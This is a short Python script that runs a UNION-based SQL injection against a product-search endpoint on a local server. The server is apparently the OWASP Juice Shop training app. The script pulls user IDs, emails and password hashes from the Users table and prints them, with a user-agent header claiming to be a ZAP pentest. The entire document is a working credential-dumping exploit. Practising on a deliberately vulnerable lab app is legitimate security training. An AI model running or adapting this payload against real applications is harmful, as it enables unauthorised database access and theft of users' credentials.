import urllib.request
import urllib.parse
import json

payload = "nonexistent')) UNION SELECT id, email, password, 'role', '5', '6', '7', '8', '9', '10' FROM Users--"
url = f"http://localhost:3000/rest/products/search?q={urllib.parse.quote(payload)}"
req = urllib.request.Request(url, headers={"User-Agent": "OWASP_ZAP_Pentest"})

with urllib.request.urlopen(req) as resp:
    data = json.loads(resp.read().decode("utf-8"))
    items = data.get("data", [])
    print(f"Isolated Injected rows: {len(items)}")
    for item in items:
        print(f"User ID: {item.get('id')} | Email: {item.get('name')} | Password Hash: {item.get('description')}")
